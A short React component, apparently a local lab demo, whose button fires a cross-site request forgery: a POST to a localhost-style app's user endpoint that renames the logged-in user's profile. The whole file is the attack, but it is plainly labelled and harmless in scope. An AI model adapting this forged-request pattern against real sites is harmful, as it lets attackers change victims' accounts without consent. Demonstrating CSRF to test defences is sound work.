"use client";
import React from "react";

const CSRFAttackPage = () => {
  const [message, setMessage] = React.useState<string>("Awaiting click...");

  const onClick = async () => {
    setMessage("Attacking!");

    try {
      const response = await fetch(
        "http://smackaho.st:3000/api/users/current",
        {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({ profile_name: "Developarvin CSRF" }),
        }
      );

      if (!response.ok) {
        throw new Error("Network response was not ok");
      }

      const data = await response.json();
      console.log(data);
    } catch (error) {
      console.error("Error:", error);
    } finally {
      setMessage("Awaiting click...");
    }
  };

  return (
    <div className="flex justify-center items-center h-screen">
      <div className="m-auto text-center">
        <div className="text-2xl font-bold">{message}</div>
        <button
          className="bg-gradient-to-r from-blue-500 to-blue-700 text-white font-bold py-2 px-4 rounded"
          onClick={onClick}
        >
          Attack smackaho.st:3000!
        </button>
      </div>
    </div>
  );
};

export default CSRFAttackPage;
